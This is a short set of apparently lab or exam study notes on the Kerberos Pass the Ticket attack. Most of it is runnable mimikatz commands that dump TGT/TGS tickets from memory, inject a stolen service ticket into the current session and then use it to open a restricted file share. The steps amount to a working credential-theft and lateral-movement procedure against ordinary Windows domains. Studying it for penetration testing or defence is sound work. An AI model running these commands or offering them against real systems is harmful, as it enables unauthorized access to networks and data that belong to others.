# Pass the Ticket

The _Pass the Ticket_ attack takes advantage of the TGS, which may be exported and re-injected elsewhere on the network and then used to authenticate to a specific service. In addition, if the service tickets belong to the current user, then no administrative privileges are required.

1. confirm current user has no access to a restricted folder
2. use mimikatz to export all the TGT/TGS from memory

```
privilege::debug
sekurlsa::tickets /export
```

3. verify newly generated tickets

```
dir *.kirbi
```

4. pick a TGS ticket and inject it through mimikatz

```
kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
```

5. veryify the ticket is in our session

```
klist
```

6. access the restricted folder

```
ls \\web04\backup
```
